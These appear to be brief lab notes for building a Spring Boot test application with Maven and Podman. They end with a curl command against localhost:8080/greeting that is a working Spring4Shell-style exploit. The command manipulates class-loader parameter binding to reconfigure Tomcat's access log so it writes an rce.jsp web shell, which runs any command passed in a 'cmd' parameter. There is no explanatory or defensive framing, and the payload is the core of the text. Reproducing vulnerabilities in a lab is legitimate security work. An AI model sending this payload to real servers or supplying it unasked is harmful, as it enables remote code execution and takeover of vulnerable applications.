

in test-app folder
mvn clean compile


http://localhost:8080/greeting


just test the if the app starts
mvn spring-boot:run 

build the actuall war
mvn clean package

(podman machine init)
podman build -t test-app .

curl -X POST \
-H "pre:<%" \
-H "post:;>" \
-H "colon:;" \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}i java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()%{colon}i int a = -1%{colon}i byte[] b = new byte[2048]%{colon}i while((a=in.read(b))!=-1){ out.println(new String(b))%{colon}i } %{post}i' \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/app' \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=rce' \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
http://localhost:8080/greeting